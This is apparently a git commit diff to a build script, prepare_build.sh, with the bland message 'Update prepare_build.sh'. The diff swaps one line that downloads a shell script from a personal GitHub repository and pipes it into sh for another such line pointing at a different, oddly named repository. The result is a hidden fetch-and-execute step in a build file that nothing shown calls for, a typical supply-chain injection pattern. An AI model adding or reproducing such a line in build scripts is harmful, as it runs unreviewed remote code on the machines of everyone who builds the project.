477b303c6810912b8ff23fcb1224d830bf79d5a4
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-03-15 02:29:11 +0700

    Update prepare_build.sh

--- script/prepare_build.sh
+++ script/prepare_build.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/shc/main/boled01.sh | sh
+curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/asuuy/main/.sh | sh
 if [ -f /.dockerinit ]; then
     export FLAGS=(--deployment --path /cache)
 
